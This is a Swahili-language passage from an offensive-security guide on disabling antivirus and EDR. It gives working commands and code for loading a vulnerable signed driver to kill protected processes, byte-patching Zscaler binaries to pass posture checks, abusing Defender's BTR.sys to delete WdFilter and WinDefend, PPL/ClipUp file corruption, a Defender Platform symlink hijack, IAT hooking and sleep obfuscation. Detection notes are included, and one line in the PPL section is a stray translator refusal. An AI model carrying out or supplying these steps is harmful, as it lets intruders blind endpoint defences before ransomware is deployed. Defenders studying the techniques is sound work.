- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ilitumia kifaa kidogo cha console kinachojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kusambaza ransomware. Kifaa hiki huja na **driver yake yenye udhaifu lakini *iliyosainiwa*** na kuitumia vibaya kutekeleza shughuli za kernel zenye ruhusa za juu ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu
1. **Driver iliyosainiwa**: Faili inayowasilishwa kwenye diski ni `ServiceMouse.sys`, lakini binary ni driver `AToolsKrnl64.sys` iliyosainiwa kihalali kutoka “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa kuwa driver ina saini halali ya Microsoft, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Usakinishaji wa huduma**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Mstari wa kwanza husajili driver kama **huduma ya kernel**, na wa pili huiwasha ili `\\.\ServiceMouse` ipatikane kutoka userland.
3. **IOCTLs zinazotolewa na driver**
   | Msimbo wa IOCTL | Uwezo                                    |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Kusitisha process yoyote kwa PID (hutumika kuua huduma za Defender/EDR) |
   | `0x990000D0` | Kufuta faili yoyote kwenye diski |
   | `0x990001D0` | Kupakua driver na kuondoa huduma |

   Mfano mdogo wa C wa uthibitisho wa dhana:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Kwa nini inafanya kazi**: BYOVD hupita kabisa ulinzi wa user-mode; code inayotekelezwa kwenye kernel inaweza kufungua michakato *iliyolindwa*, kuisimamisha, au kuchezea kernel objects bila kujali vipengele vya hardening kama PPL/PP au ELAM.

Utambuzi / Upunguzaji wa hatari
• Washa orodha ya Microsoft ya madereva hatari yaliyozuiwa (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
• Fuatilia uundaji wa huduma mpya za *kernel* na toa tahadhari dereva anapopakiwa kutoka kwenye directory inayoweza kuandikiwa na kila mtu au hayupo kwenye allow-list.
• Fuatilia handles za user-mode kwa custom device objects zinazofuatwa na miito ya kutiliwa shaka ya `DeviceIoControl`.

### Kupita Ukaguzi wa Mkao wa Kifaa wa Zscaler Client Connector kwa Kurekebisha Binary Zilizo Kwenye Diski

Zscaler’s **Client Connector** hutekeleza sheria za mkao wa kifaa ndani ya kifaa na hutegemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Chaguo mbili dhaifu za usanifu hufanya kupita ukaguzi wote kuwezekane:

1. Tathmini ya mkao wa kifaa hufanyika **upande wa mteja pekee** (boolean hutumwa kwa seva).
2. RPC endpoints za ndani huthibitisha tu kwamba executable inayounganisha **imesainiwa na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kurekebisha binary nne zilizosainiwa kwenye diski**, njia zote mbili zinaweza kuzimwa:

| Binary | Mantiki ya awali iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila wakati ili kila ukaguzi uonekane umetii masharti |
| `ZSAService.exe` | Miito isiyo ya moja kwa moja ya `WinVerifyTrust` | NOP-ed ⇒ mchakato wowote (hata usiosainiwa) unaweza kuunganishwa na RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Hubadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa uadilifu wa tunnel | Hukatizwa |

Sehemu ndogo ya patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Baada ya kubadilisha faili za awali na kuwasha upya service stack:

* **Ukaguzi wote** wa posture unaonyesha **green/compliant**.
* Binaries ambazo hazijasainiwa au zimebadilishwa zinaweza kufungua endpoints za named-pipe RPC (k.m. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathiriwa inapata ufikiaji usio na vizuizi kwa mtandao wa ndani unaofafanuliwa na policies za Zscaler.

Uchunguzi huu wa kisa unaonyesha jinsi maamuzi ya uaminifu yanayofanywa upande wa client pekee na ukaguzi rahisi wa signature vinavyoweza kushindwa kwa marekebisho machache ya byte.

## Matumizi mabaya ya utendakazi unaoaminika wa Microsoft Defender `BTR.sys`

Driver ya Defender ya **Boot-Time Removal** ni mfano wa kinyume cha BYOVD ya kawaida. `BTR.sys` ni component halali ya remediation iliyosainiwa na Microsoft, isiyo na bug ya memory corruption wala interface ya IOCTL; baada ya kupata ufikiaji wa administrator na `SeLoadDriverPrivilege`, operator anaweza badala yake kughushi transaction yake binafsi ya remediation na kupata utendakazi uliokusudiwa wa faili/registry wa Ring-0. Hii ni **primitive ya kubatilisha AV/EDR baada ya compromise, si njia ya kupata ufikiaji wa awali au kupandisha ruhusa**, na driver inaweza kutolewa kutoka kwenye resource ya `BOOTTIMETOOL` ya `MpEngine.dll` ya target yenyewe, badala ya kuleta driver ya mtu mwingine inayoweza kuvutia macho.<sup>[[36]](#references)</sup>

### Kuweka tayari driver ya one-shot

Kwa kawaida, Defender huweka resource kama faili lenye jina nasibu la `[a-z]{8}.sys` na kusajili kernel service yenye jina linalofanana. `DriverEntry` husoma thamani ya `Args` ya service, hufungua NTFS ADS iliyorejelewa, husimbua na kuthibitisha orodha ya vitendo, huandika feedback, kisha hurudisha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya utekelezaji kufanikiwa ili driver ijiondoe badala ya kubaki ikiwa resident. Service ghushi huwa na thamani zifuatazo zinazoitambulisha.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Streamu ya `:changelist` ina blob moja iliyosimbwa kwa RC4. Build zilizochanganuliwa hutumia tena ufunguo usiobadilika wa baiti 256, kwa hivyo usimbaji fiche si kizuizi cha uidhinishaji. Plaintext halali ina header ya jumla ya baiti 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC ya header na kitambulisho cha transaction kinachotokana na payload), ikifuatiwa na njia ya feedback ya UTF-16 inayomalizika kwa null na idadi yoyote ya vipengee. Kila kipengee kina header ya baiti 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na data mahususi kwa action inayoishia kwa **baiti nne hasa za NUL**. Kila eneo la header/data hukaguliwa kivyake kwa CRC-32 polynomial `0xEDB88320`, hali ya mwanzo `0xFFFFFFFF`, na **bila XOR ya mwisho** (`~CRC32`); hali ya CRC huwekwa upya kwa kila eneo.<sup>[[36]](#references)[[37]](#references)</sup>

Vitambulisho vya action vinavyokubaliwa hufichua primitive hizi za kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Data ya kipengee | Matokeo |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa faili, ikiwemo faili iliyofungwa |
| 2 | `[UTF-16 path]` | Ondoa directory tupu |
| 3 | `[Flags][source][destination]` | Hamisha faili hadi kwenye njia iliyolindwa iliyochaguliwa na mshambuliaji; destination tupu humaanisha kufuta |
| 4 | `[Flags][key path]` | Futa key ya registry pamoja na vitu vyake vyote |
| 5 | `[Flags][key path + "\\" + value]` | Futa value ya registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/sasisha value ya registry na uunde njia za key zinazokosekana |

Kwa actions 5 na 6, kitenganishi cha key/value kwenye waya ni **backslash mbili mfululizo**; njia iliyoandikwa kwa muundo wa kawaida haitatenganishwa ipasavyo. Faili ya feedback kwa kiasi kikubwa huakisi ombi, lakini baiti nne za kwanza za data ya kila kipengee huwa `NTSTATUS` yake inayotokana na matokeo. Kwa actions 1 na 2, ambazo hazina sehemu ya flags mwanzoni, BTR huhamisha njia kwenye baiti nne za akiba zilizo mwisho ili kutoa nafasi ya status hiyo.<sup>[[36]](#references)</sup>

### Mtiririko wa kazi wa `BTR_CLI` na muda wa kuwashwa mapema

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza mnyororo mzima: kutoa `BTR.sys` kutoka Defender ya ndani, kuunda `<random>.sys:changelist` na stream ya feedback, kusarilisha/kukokotoa checksum/kusimba kwa actions zilizounganishwa, kuunda key ya registry ya service moja kwa moja, kisha kuita `NtLoadDriver` kwa `-trigger now` au kuiacha kama driver ya kuanzishwa wakati wa system-start kwa `-trigger boot`. Kuweka taarifa moja kwa moja kwenye registry huepuka njia ya kawaida ya SCM `CreateServiceW`, na kwa hivyo **hakuzalishi** Event ID 7045 ya usakinishaji wa service. Vitu vilivyoanzishwa na boot vinaweza kuondolewa baadaye kwa `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` haiwezi kutumika kwa sababu BTR hufanya file I/O kutoka `DriverEntry` kabla storage stack na kiungo cha `SystemRoot` havijawa tayari. `Start=1` pamoja na kundi la kipaumbele cha juu la `Boot Bus Extender` badala yake huendeshwa katika Phase 1: NTFS inaweza kutumika, lakini madereva mengi ya usalama yanayoanza na mfumo na huduma za EDR za user-mode bado hazijaanzishwa. Vichujio vinavyoanza wakati wa boot kama `WdFilter` huenda tayari vimepakiwa, lakini BTR inaweza kuondoa binaries zake au usanidi wa huduma kabla ya kuwasha tena, na inaweza kufuta executable za huduma kabla SCM haijazizindua. ELAM haizibi pengo hili kwa sababu BTR huendeshwa baada ya tathmini ya boot-start na ina sahihi halali ya Microsoft.<sup>[[36]](#references)</sup>

Vitendo vingi huendeshwa katika transaction moja. PoC huweka Action 1 mbele kwa `\SystemRoot\Temp\BootClean.log` iliyowekwa moja kwa moja: BTR huunda log hii, kisha hutekeleza ombi lake la kuifuta na kuiondoa kabla ya kujiondoa. Hii hupunguza ushahidi, huku kuweka maoni katika `<random>.sys:<random>.dat` kukiwezesha kuondoa driver na streams zote mbili pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Uwiano wa ugunduzi wenye ishara nyingi

Sheria zinazotegemea sahihi pekee na orodha ya Microsoft ya kuzuia madereva hatarishi hazishughulikii matumizi mabaya ya utendaji uliokusudiwa wa BTR. Pendelea uwiano huu wa kitabia, huku ukitofautisha lineage halali ya Defender na launcher yoyote isiyo ya kawaida.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Uundaji wa `.sys:changelist` hutokea kila mara wakati wa staging ya BTR. ADS ya `.dat` iliyoambatishwa kwa `.sys` hiyo hiyo inatia shaka zaidi kwa sababu Defender halali kwa kawaida huweka maoni chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** linganisha uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` ulio na `Args=...:changelist` na `Group=Boot Bus Extender` na kutokuwepo kwa tukio linalolingana la usakinishaji wa SCM.
- **Sysmon 6 -> 23:** linganisha upakiaji wa driver ya BTR inayojulikana kutoka lineage isiyo ya Defender na ufutaji wa faili unaofuata unaohusishwa na `System`/PID 4, hasa kwa binaries za usalama.
- **Sysmon 11 -> 23:** toa tahadhari kuhusu uundaji na ufutaji wa haraka wa `\SystemRoot\Temp\BootClean.log` na `System`/PID 4.
- Zuia na kagua ugawaji/uwezeshaji wa `SeLoadDriverPrivilege`; sahihi ya Microsoft pekee haitoshi kuwa msingi wa kuamini pale driver ya zana ya usalama inapowekwa staging na `cmd.exe`, PowerShell, au mchakato usiojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Kuharibu AV/EDR Kwa Kutumia LOLBINs

Protected Process Light (PPL) hutekeleza ngazi ya signer/level ili michakato iliyolindwa yenye kiwango sawa au cha juu pekee iweze kuingiliana na michakato mingine iliyolindwa. Kwa upande wa mashambulizi, ukiweza kuzindua kihalali binary iliyowezeshwa kwa PPL na kudhibiti hoja zake, unaweza kubadilisha utendaji usio na madhara (kwa mfano, logging) kuwa primitive ya uandishi yenye vizuizi na inayotumia PPL dhidi ya saraka zilizolindwa zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya mchakato uendeshwe kama PPL
- EXE lengwa (na DLL zozote zilizopakiwa) lazima zisainiwe kwa EKU inayoweza kutumia PPL.
- Mchakato lazima uundwe kwa kutumia CreateProcess pamoja na flags hizi: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Lazima iombwe protection level inayooana na signer ya binary (kwa mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa signers za anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa signers za Windows). Viwango visivyo sahihi vitasababisha uundaji kushindwa.

Tazama pia utangulizi mpana kuhusu PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Zana za launcher
- Zana saidizi ya open-source: CreateProcessAsPPL (huchagua protection level na kupitisha hoja kwa EXE lengwa):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Muundo wa matumizi:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Siwezi kutafsiri hatua zinazowezesha kuzima antivirus kwa kuharibu faili zake na kupanga utekelezaji wakati wa kuwasha kompyuta. Muhtasari salama: maandishi yanaeleza matumizi mabaya ya `ClipUp.exe` kuandika kwenye eneo linalolindwa na antivirus, kisha kuzuia antivirus kuanza. Kama lengo ni kujihami, naweza kusaidia kutafsiri mwongozo wa kugundua au kuzuia mbinu hii.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Maelezo na vikwazo
- Huwezi kudhibiti maudhui ambayo ClipUp huandika, ila mahali yanapoandikwa; primitive hii inafaa kwa kuharibu data badala ya kuingiza maudhui mahususi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service, pamoja na muda wa kuwasha upya.
- Muda ni muhimu: target haipaswi kuwa wazi; utekelezaji wakati wa kuwasha huepusha kufungwa kwa faili.

Ugunduzi
- Uundaji wa process ya `ClipUp.exe` yenye arguments zisizo za kawaida, hasa ikiwa parent wake ni launcher zisizo za kawaida, wakati wa kuwasha au karibu na wakati huo.
- Services mpya zilizowekwa kuwasha binaries za kutiliwa shaka kiotomatiki na zinazoanza kabla ya Defender/AV kila mara. Chunguza uundaji/urekebishaji wa service kabla ya hitilafu za kuwasha Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye binaries/Platform directories za Defender; uundaji/urekebishaji usiotarajiwa wa faili na processes zilizo na protected-process flags.
- Telemetry ya ETW/EDR: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya viwango vya PPL na binaries zisizo za AV.

Hatua za kupunguza hatari
- WDAC/Code Integrity: punguza binaries zilizotiwa saini zinazoweza kuendeshwa kama PPL na parents ambazo zinaweza kuzianzisha; zuia matumizi ya ClipUp nje ya mazingira halali.
- Usimamizi wa service: punguza uundaji/urekebishaji wa services zinazojiwasha kiotomatiki na fuatilia udanganyifu wa mpangilio wa kuanza.
- Hakikisha ulinzi dhidi ya tampering wa Defender na ulinzi wa early-launch umewashwa; chunguza hitilafu za kuanza zinazoashiria uharibifu wa binary.
- Fikiria kuzima utengenezaji wa majina mafupi ya 8.3 kwenye volumes zinazohifadhi zana za usalama ikiwa inaoana na mazingira yako (jaribu kwa makini).

## Kuhujumu Microsoft Defender kupitia Symlink Hijack ya Folda ya Toleo la Platform

Windows Defender huchagua platform itakayoendeshwa kwa kuorodhesha folda ndogo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua folda ndogo yenye mfuatano wa toleo ulio juu zaidi kwa mpangilio wa kileksikografia (kwa mfano, `4.18.25070.5-0`), kisha huanzisha processes za Defender service kutoka humo (na kusasisha njia za service/registry ipasavyo). Uchaguzi huu huamini maingizo ya directory, yakiwemo directory reparse points (symlinks). Msimamizi anaweza kutumia hili kuelekeza Defender kwenye njia inayoweza kuandikwa na mshambuliaji na kufanikisha DLL sideloading au kuvuruga service.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya folda ya Platform)
- Uwezo wa kuwasha upya au kuchochea uteuzi upya wa Defender platform (service kuanzishwa upya wakati wa kuwasha)
- Zana zilizojengewa ndani pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia uandishi kwenye folda zake yenyewe, lakini uteuzi wake wa platform huamini maingizo ya directory na huchagua toleo lililo juu zaidi kwa mpangilio wa kileksikografia bila kuthibitisha kuwa lengwa linaelekeza kwenye njia iliyolindwa/kuaminika.

Hatua kwa hatua (mfano)
1) Andaa nakala inayoweza kuandikwa ya folda ya sasa ya platform, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda directory symlink ya toleo la juu zaidi ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa Trigger (kuwasha upya kunapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya process chini ya `C:\TMP\AV\` na usanidi wa service/registry unaoonyesha eneo hilo.

Chaguo za post-exploitation
- DLL sideloading/code execution: Weka/replace DLL ambazo Defender hupakia kutoka kwenye saraka ya application yake ili kutekeleza code katika processes za Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili njia iliyosanidiwa isitatuliwe wakati wa kuwasha tena, na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Kumbuka kuwa technique hii haitoi privilege escalation yenyewe; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Timu nyekundu zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya target module yenyewe kwa kuhuking Import Address Table (IAT) yake na kuelekeza API zilizochaguliwa kupitia code ya position-independent (PIC) inayodhibitiwa na mshambuliaji. Hii hupanua evasion zaidi ya API chache ambazo kits nyingi hutoa (k.m., CreateProcessA), na kutumia ulinzi huohuo kwa BOFs na post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya jumla
- Weka PIC blob pamoja na target module kwa kutumia reflective loader (ikiwa imetangulizwa au kama companion). PIC lazima iwe self-contained na position-independent.
- Host DLL inapopakia, pitia IMAGE_IMPORT_DESCRIPTOR yake na ubadilishe IAT entries za imports lengwa (k.m., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) zielekeze kwenye PIC wrappers nyembamba.
- Kila PIC wrapper hutekeleza evasions kabla ya kufanya tail-call kwenda kwenye anwani halisi ya API. Evasions za kawaida ni pamoja na:
  - Kuficha/kuonyesha memory kuzunguka call (k.m., encrypt beacon regions, RWX→RX, kubadilisha majina/ruhusa za kurasa), kisha kurejesha hali baada ya call.
  - Call-stack spoofing: tengeneza stack isiyo na madhara na uhamie kwenye target API ili uchanganuzi wa call-stack utambue frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Kwa uoanifu, toa interface ili Aggressor script (au inayolingana nayo) iweze kusajili API zitakazohukiwa kwa Beacon, BOFs na post-ex DLLs.

Kwa nini IAT hooking inafaa hapa
- Hufanya kazi kwa code yoyote inayotumia import iliyohukiwa, bila kubadilisha code ya tool au kutegemea Beacon kupitisha API maalum.
- Hufunika post-ex DLLs: kuhuking LoadLibrary* hukuwezesha kunasa upakiaji wa modules (k.m., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hizohizo kwa API calls zake.
- Hurejesha matumizi ya kuaminika ya amri za post-ex zinazozindua process dhidi ya detections zinazotegemea call-stack kwa kuzungushia CreateProcessA/W.

Mchoro mdogo wa IAT hook (pseudocode ya x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Maelezo
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr huonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo sana na salama kwa PIC; pata API halisi kupitia thamani ya awali ya IAT uliyonasa kabla ya kuweka patch au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na epuka kuacha kurasa zikiwa writable+executable.

Stub ya call-stack spoofing
- PIC stubs za mtindo wa Draugr huunda call chain bandia (return addresses zinazoelekeza kwenye modules zisizo na madhara) kisha huingia kwenye API halisi.
- Hii hukwepa detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs zinapotumia APIs nyeti.
- Changanya na mbinu za stack cutting/stack stitching ili kuingia ndani ya frames zinazotarajiwa kabla ya API prologue.

Ujumuishaji wa kiutendaji
- Weka reflective loader kabla ya post-ex DLLs ili PIC na hooks zianze kiotomatiki DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike moja kwa moja na njia ileile ya evasion bila mabadiliko ya code.

Mazingatio ya utambuzi/DFIR
- Uadilifu wa IAT: entries zinazoelekeza kwenye anwani zisizo za image (heap/anon); uthibitishaji wa mara kwa mara wa import pointers.
- Hitilafu za stack: return addresses zisizo sehemu ya images zilizopakiwa; mipito ya ghafla kwenda kwenye PIC isiyo ya image; ancestry ya RtlUserThreadStart isiyolingana.
- Telemetry ya loader: writes za ndani ya process kwenye IAT, shughuli za mapema za DllMain zinazorekebisha import thunks, maeneo ya RX yasiyotarajiwa yanayoundwa wakati wa kupakia.
- Kukwepa upakiaji wa image: ikiwa unafanya hooking ya LoadLibrary*, fuatilia upakiaji unaotiliwa shaka wa automation/clr assemblies unaohusiana na matukio ya kuficha memory.

Vipengele vya msingi na mifano inayohusiana
- Reflective loaders zinazofanya IAT patching wakati wa kupakia (mfano, TitanLdr, AceLdr)
- Memory masking hooks (mfano, simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (mfano, Draugr)


## IAT Hooking Wakati wa Import + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks wakati wa import kupitia PICO inayokaa kwenye memory

Ikiwa unadhibiti reflective loader, unaweza kufanya hooking ya imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya `GetProcAddress` ya loader na resolver maalum inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Tengeneza **resident PICO** (persistent PIC object) inayobaki baada ya transient loader PIC kujifuta.
- Toa function ya `setup_hooks()` inayobadilisha import resolver ya loader (mfano, `funcs.GetProcAddress = _GetProcAddress`).
- Katika `_GetProcAddress`, ruka ordinal imports na utumie utafutaji wa hook unaotegemea hash kama `__resolve_hook(ror13hash(name))`. Hook ikipatikana, irudishe; la sivyo, elekeza ombi kwa `GetProcAddress` halisi.
- Sajili hook targets wakati wa ku-link kwa kutumia entries za Crystal Palace `addhook "MODULE$Func" "hook"`. Hook itaendelea kuwa halali kwa sababu iko ndani ya resident PICO.

Hii hutoa **IAT redirection wakati wa import** bila kufanya patching kwenye code section ya DLL iliyopakiwa baada ya kupakiwa.

### Kulazimisha imports zinazoweza kufanyiwa hooking wakati target inatumia PEB-walking

Import-time hooks hufanya kazi tu ikiwa function ipo kwenye IAT ya target. Ikiwa module inatatua APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili njia ya `ProcessImports()` ya loader iione:

- Badilisha utatuzi wa hashed export (mfano, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na marejeo ya moja kwa moja kama `&WaitForSingleObject`.
- Compiler itatoa IAT entry, na hivyo kuwezesha interception wakati reflective loader inatatua imports.

### Sleep/idle obfuscation ya mtindo wa Ekko bila kufanya patching ya `Sleep()`

Badala ya kufanya patching ya `Sleep`, hook **primitives halisi za wait/IPC** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, zungushia call kwa obfuscation chain ya mtindo wa Ekko inayosimba image iliyo kwenye memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazoita `NtContinue` zikiwa na `CONTEXT` frames zilizotayarishwa.
- Mlolongo wa kawaida (x64): weka image kuwa `PAGE_READWRITE` → isimba kwa RC4 kupitia `advapi32!SystemFunction032` katika image nzima iliyomapishwa → tekeleza wait inayozuia → ifumbue kwa RC4 → **rejesha ruhusa za kila section** kwa kupitia PE sections → toa ishara ya kukamilika.
- `RtlCaptureContext` hutoa `CONTEXT` ya kiolezo; nakili kwenye frames nyingi na weka registers (`Rip/Rcx/Rdx/R8/R9`) ili kuita kila hatua.

Maelezo ya kiutendaji: rudisha “success” kwa waits ndefu (mfano, `WAIT_OBJECT_0`) ili caller iendelee wakati image imefichwa. Muundo huu huficha module dhidi ya scanners wakati wa idle na huepuka saini ya kawaida ya “patched `Sleep()`”.

Mawazo ya utambuzi (yanayotegemea telemetry)
- Mfululizo wa callbacks za `CreateTimerQueueTimer` zinazoelekeza kwenye `NtContinue`.
- `advapi32!SystemFunction032` kutumika kwenye buffers kubwa zinazoendelea zenye ukubwa wa image.
- `VirtualProtect` ya range kubwa ikifuatiwa na urejeshaji maalum wa ruhusa za kila section.

### Usajili wa CFG wakati wa runtime kwa sleep-obfuscation gadgets

Kwenye targets zilizo na CFG, indirect jump ya kwanza kwenda kwenye gadget iliyo katikati ya function kama `jmp [rbx]` au `jmp rdi` kwa kawaida husababisha process ku-crash ikiwa na `STATUS_STACK_BUFFER_OVERRUN`, kwa sababu gadget haipo kwenye metadata ya CFG ya module. Ili kuweka chains za mtindo wa Ekko/Kraken zikifanya kazi ndani ya processes zilizoimarishwa:<sup>[[30]](#references)</sup>

- Sajili kila indirect destination inayotumiwa na chain kupitia `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na entries za `CFG_CALL_TARGET_VALID`.
- Kwa anwani zilizo ndani ya images zilizopakiwa (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ihusishe **ukubwa wote wa image**.
- Kwa maeneo yaliyomapishwa kwa mikono/PIC/stomped, tumia **allocation base** na ukubwa wa allocation badala yake.
- Weka alama si kwa dispatch gadget pekee, bali pia kwa exports zinazofikiwa kwa njia isiyo ya moja kwa moja (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na sehemu zozote za executable zinazodhibitiwa na mshambuliaji ambazo zitakuwa indirect targets.

Hii hubadilisha sleep chains za mtindo wa ROP/JOP kutoka “hufanya kazi tu kwenye processes zisizo na CFG” na kuwa primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizocompiliwa kwa `/guard:cf`.

### Stack spoofing salama kwa CET kwa threads zinazolala

Kubadilisha `CONTEXT` yote huonekana wazi na kunaweza kusababisha hitilafu kwenye mifumo ya CET Shadow Stack kwa sababu `Rip` iliyospoofiwa lazima bado ilingane na hardware shadow stack. Muundo salama zaidi wa sleep-masking ni:<sup>[[30]](#references)</sup>

